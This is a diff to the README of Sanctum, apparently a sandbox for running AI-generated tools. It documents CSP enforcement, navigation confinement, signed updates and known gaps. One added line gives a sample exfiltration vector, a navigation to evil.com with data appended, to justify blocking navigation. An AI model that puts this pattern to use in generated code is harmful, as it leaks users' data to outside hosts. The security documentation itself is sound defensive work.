@@ -36,13 +36,17 @@ Built for people who run AI-generated tools but won't accept "trust me."
 
 **1 — Origin isolation.** Each tool runs at a distinct `sanctum-tool://tool-{id}/` origin. `localStorage`, `IndexedDB`, cookies, and service workers are scoped per-origin by the WebView. Two tools can never read each other's storage.
 
-**2 — CSP enforcement.** Default is `connect-src 'none'` with every fetch-type directive denied. Approved network hosts are injected as explicit `https://` and `wss://` entries at window creation. Nothing is relaxed unless you approved it.
+**2 — CSP enforcement.** Default is `connect-src 'none'` with every fetch-type directive denied. Approved network hosts are injected as explicit `https://` and `wss://` entries at window creation. Nothing is relaxed unless you approved it. Host strings are validated as DNS hostnames before they reach the policy, so a crafted URL in a tool cannot restructure the header. `form-action` stays `'none'` regardless of approvals — it does not inherit from `default-src`, and approving a fetch destination is not approving a navigation target.
+
+**2a — Navigation confinement.** No CSP directive governs top-level navigation, so `connect-src 'none'` alone does not stop `location.href = 'https://evil.com/?' + data`. Tool windows are pinned to their own `sanctum-tool://` origin; every other scheme and host — including `data:`, `file:`, and other tools' origins — is refused.
 
 **3 — IPC removal.** An initialization script deletes all `__TAURI__*` globals from the window before the tool's HTML is parsed. Tools have zero OS bridge access. The [tool capability set](src-tauri/capabilities/tool-default.json) is empty — all Tauri commands are denied even if IPC bootstrap is present.
 
 **4 — Integrity check.** SHA-256 of the stored file is recomputed on every launch. Mismatch → `quarantined = 1` in the DB, window creation aborted, error shown. No exceptions.
 
 **5 — Static scan (advisory only).** The scanner drives the permission manifest UI. It is not a security control. Capabilities hidden behind dynamic string construction, obfuscation, or CDN-loaded scripts may be missed. The sandbox enforces limits regardless.
+
+**6 — Signed updates.** Update manifests and payloads are verified against a minisign public key compiled into the binary. An unsigned or tampered update is rejected before it touches disk, so compromising the release host is not enough to push code to installs. Updates are never applied without an explicit click. The check runs in Rust — the updater's IPC surface is granted to no window, so it is unreachable from a tool.
 
 > **What Sanctum does not prevent:** a tool using only the capabilities you approved, and then doing harmful things with them. Approve capabilities with the same care you'd give any permission prompt.
 
@@ -81,7 +85,7 @@ Signed release builds require Apple Developer Program and Azure Trusted Signing 
 | IPC removal | ✓ |
 | SQLite library (list, tag, rollback) | ✓ |
 | Signed + notarized release builds | pending |
-| Auto-updates | roadmap |
+| Signed auto-updates | ✓ wired, unverified until first signed release |
 | AST-based scanner (catches obfuscation) | roadmap |
 | Org policy file | roadmap |
 | Tool registry / provenance | roadmap |
@@ -153,7 +157,7 @@ Scanner limitations: dynamic string construction, obfuscated/minified code, CDN-
 ### What Sanctum does not prevent (v0, honest)
 
 - **Phishing / fake UI** — a tool can display anything. The `⚠ Third-party tool` window title and capability summary are the only mitigations.
-- **LAN timing probes** — `connect-src 'none'` blocks HTTP exfiltration but not timing-based side channels via `<img>` data URIs.
+- **LAN timing probes** — `connect-src 'none'` blocks HTTP exfiltration but not timing-based side channels via `<img>` data URIs. Navigation to loopback (`*.localhost`) is permitted on Windows, where the custom protocol is served over `http://<scheme>.localhost`; that path has not yet been verified on a real Windows build.
 - **Cross-tool CPU/memory timing** — same Tauri process; OS-level side channels exist.
 - **Tool crashing the host** — tool window and host share one Tauri process. A WebKit crash in a tool takes down the app.
 
